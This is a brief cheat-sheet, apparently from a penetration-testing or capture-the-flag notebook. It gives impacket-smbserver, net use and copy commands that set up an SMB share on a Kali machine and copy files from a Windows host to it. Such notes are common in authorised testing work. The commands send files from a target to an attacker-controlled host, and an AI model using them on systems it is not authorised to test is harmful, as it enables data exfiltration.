# Start SMB Server

does not work with guest access
`impacket-smbserver -smb2support -user miracle -password man sharedFolder $(pwd)`

# Copy Files Over

can test connection first if needed
`net use \\<kali_IP>\shareFolder /user:miracle man`

copy files
`copy <file> \\<kali_IP>\sharedFolder`
